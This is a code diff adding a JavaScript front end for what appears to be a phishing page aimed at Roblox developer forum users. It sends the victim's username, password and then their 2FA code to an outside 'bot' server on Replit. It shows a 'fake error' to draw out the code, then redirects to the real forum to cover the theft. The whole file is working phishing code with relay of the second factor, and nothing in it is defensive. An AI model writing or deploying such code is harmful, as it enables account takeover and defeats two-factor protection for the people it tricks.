@@ -1,0 +1,53 @@
+// The URL of your Replit bot server
+const BOT_URL = 'https://your-repl-name.replit.dev';
+
+// Function to handle the initial login submission
+async function submitLogin() {
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+
+    // Send credentials to the bot
+    const response = await fetch(`${BOT_URL}/login`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, password })
+    });
+
+    const result = await response.json();
+
+    if (result.status === '2FA_Required') {
+        // Bot says 2FA is needed. Show the fake error and the 2FA form.
+        document.getElementById('loginError').classList.remove('hidden');
+        document.getElementById('loginDiv').classList.add('hidden');
+        document.getElementById('tfaDiv').classList.remove('hidden');
+    } else {
+        // Handle other statuses like incorrect password if needed
+    }
+}
+
+// Function to handle the 2FA code submission
+async function submitTfa() {
+    const tfaCode = document.getElementById('tfaCode').value;
+
+    // Send the 2FA code to the bot
+    const response = await fetch(`${BOT_URL}/submit-tfa`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ tfaCode })
+    });
+
+    const result = await response.json();
+
+    if (result.status === 'Success') {
+        // Bot confirms success. Show success message and redirect.
+        document.getElementById('tfaDiv').classList.add('hidden');
+        document.getElementById('successDiv').classList.remove('hidden');
+        
+        // Redirect to the real dev forums page
+        setTimeout(() => {
+            window.location.href = 'https://devforum.roblox.com/';
+        }, 2000);
+    } else {
+        // Handle incorrect 2FA code if needed
+    }
+}
